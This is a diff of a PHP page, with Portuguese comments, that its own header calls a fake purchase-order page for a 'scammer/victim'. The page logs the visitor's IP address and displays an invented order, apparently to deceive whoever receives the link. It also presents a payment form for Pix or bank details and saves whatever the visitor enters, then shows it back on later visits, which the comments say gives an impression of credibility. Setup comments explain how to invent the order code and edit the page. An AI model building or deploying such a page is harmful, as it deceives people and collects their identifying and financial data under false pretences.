@@ -1,16 +1,25 @@
 <?php
+#########################################################
+#  Este script é uma página falsa de pedido de compra,  #
+#  que é enviada ao golpista/vítima. Esta página, com-  #
+#  porta-se como um sistema, que quando se informa um   #
+#  código, exibe informações do pedido de compra cor-   #
+#  respondente. Este pedido, claro, é apenas uma ilu-   #
+#  são. Para usá-lo, basta definir um código qualquer   #
+#  no item indicado.                                    #
+#########################################################
+
+/* mensagem a ser retornada em caso de exceção */
 $errormessage="Erro desconhecido";
 
 
-
+/* obtendo o IP do visitante de algumas formas diferentes */
 function getRealIPAddr()
 {
-       //check ip from share internet
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
  {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  }
-       //to check ip is pass from proxy
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
  {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
@@ -19,15 +28,16 @@ function getRealIPAddr()
  {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
-
  return $ip;
 }
 $visitorip = getRealIPAddr();  
 
-
-
-
-
+/*
+função que analisa a informação de pagamento salva no sistem.
+Sim, se o visitante preenche os dados para recebimento, eles
+serão salvos e quando o visitante acessar o mesmo link, verá
+estes dados o que dá impressão de credibilidade
+*/
 
 function payanalize($data){
   $datarr=json_decode($data,true);
@@ -51,8 +61,9 @@ if($datarr['type']=='conta'){
 
 
 return($htmlret);
-
 }
+
+/* função que lê arquivos */
 function filereader($orderid){
   $filedata="";
   if(file_exists("./".$orderid.".txt")){
@@ -60,7 +71,6 @@ function filereader($orderid){
   }
   return($filedata);
 }
-
 
 ?>
 <!DOCTYPE html>
@@ -75,7 +85,14 @@ function filereader($orderid){
 if(isset($_REQUEST['ordid'])){
 
   $stage=1;
-  if(strtolower($_REQUEST['ordid']) == "oc24458523br"){
+       
+/*
+Coloque na linha seguinte, um código para ser o código de compra da página.
+Quando for fornecê-lo a alguém, será semelhante ao padrão abaixo
+https://seusite.com/intranet/compras?ordid=INVENTEUMCODIGOAQUI
+*/
+
+  if(strtolower($_REQUEST['ordid']) == "INVENTEUMCODIGOAQUI"){
     $ordid=strtoupper($_REQUEST['ordid']);
     $errormessage="Sem erro, sucesso";
     $filedata=filereader($ordid);
@@ -189,19 +206,14 @@ if(isset($_REQUEST['ordid'])){
     ?>
     <div class="container-fluid margedbottom spaced-cont">
       <div class="row justify-content-md-center">
-
         <div class="card col-sm-12 col-md-8 col-lg-6 col-xl-4 verticalpadd">
-
           <h5>Informe um código de ordem de compra para avançar</h5>
-
           <?php 
           if($stage == 1){
             echo "<p class='rederror'>".$errormessage."</p>";
           }
           ?>
-
           <hr>
-
           <form method="post">
             <div class="form-group">
               <label for="codCompra">Código de pedido de compra</label>
@@ -210,32 +222,20 @@ if(isset($_REQUEST['ordid'])){
             </div>
             <button type="submit" class="btn btn-primary btn-lg btn-block">Avançar</button>
           </form>
-
         </div>
-
       </div>
     </div>
-
-
     <?php
-
   }
 
-
-  if($stage == 2 || $stage == 3){
-
+       if($stage == 2 || $stage == 3){
+/* Edite este trecho para personalizar a página */
     ?>
-
     <hr>
     <hr>
-
-
-
     <div class="container-fluid margedbottom">
       <div class="row justify-content-md-center">
-
         <div class="col-sm-12 col-md-8 col-lg-6 col-xl-4">
-
           <div class="alert alert-success" role="alert">
             <h5 class="alert-heading">Pedido de compra localizado!</h5>
             <p>Código de pedido de compra Nº <strong><?php echo $ordid; ?></strong></p>
@@ -245,6 +245,8 @@ if(isset($_REQUEST['ordid'])){
             <p>Solicitante: <strong>Laurindo Correa Martins</strong></p>
             <hr>
 <?php 
+/* Termine a edição aqui */
+              
 echo $paymentdata;
 ?>
           </div>
@@ -260,13 +262,9 @@ if($stage == 2){
 ?>
 
         <div class="col-sm-12 col-md-8 col-lg-6 col-xl-4">
-
           <div class="row"><div class="col-sm-12"><h5>Forma de pagamento</h5></div></div>
-
           <div class="row"><div class="col-sm-12">Selecione abaixo</div></div>
-
           <div class="row">
-
             <div class="col-sm-12 col-md-12 col-lg-6 ">
              <p class="clicableradio"  onclick="clickedradio('pixtipo')" ><input id="pixtipoin" onchange="radiosel(this.value)" value="pixtipo" name="tipoconta" type="radio"/> Pix</p>
            </div>
